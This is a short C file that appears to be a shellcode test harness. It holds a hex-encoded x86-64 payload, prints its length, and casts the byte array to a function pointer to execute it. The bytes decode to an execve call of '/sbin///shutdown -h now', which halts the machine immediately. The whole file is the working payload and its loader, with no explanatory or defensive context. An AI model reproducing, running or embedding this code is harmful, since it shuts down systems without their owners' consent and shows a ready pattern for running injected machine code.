#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\xf7\xe6\x6a\x77\x66\x68\x6e\x6f\x48\x89\xe3\x52\x66\x68\x2d\x68\x48\x89\xe1\x52\x49\xb8\x2f\x73\x62\x69\x6e\x2f\x2f\x2f\x49\xba\x73\x68\x75\x74\x64\x6f\x77\x6e\x41\x52\x41\x50\x48\x89\xe7\x52\x53\x51\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}